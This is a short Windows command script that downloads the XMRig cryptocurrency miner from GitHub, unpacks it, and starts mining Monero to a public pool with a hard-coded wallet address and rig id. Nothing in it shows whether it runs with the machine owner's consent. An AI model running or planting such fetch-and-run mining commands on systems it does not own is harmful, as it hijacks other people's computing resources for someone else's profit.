powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-gcc-win64.zip', 'package.zip')"
tar -xf package.zip --strip-components=1
xmrig -o us-west.minexmr.com:4444 -u 84J1AXpwQfrA92Yw81zg1MPWUn7dAYK7adcwW9qNRSHkLMcVRvoSZghZvAwvdNv1PwWL54Tc6m6JG3btLsqQ8gZGGJduZfZ --rig-id "G 3"
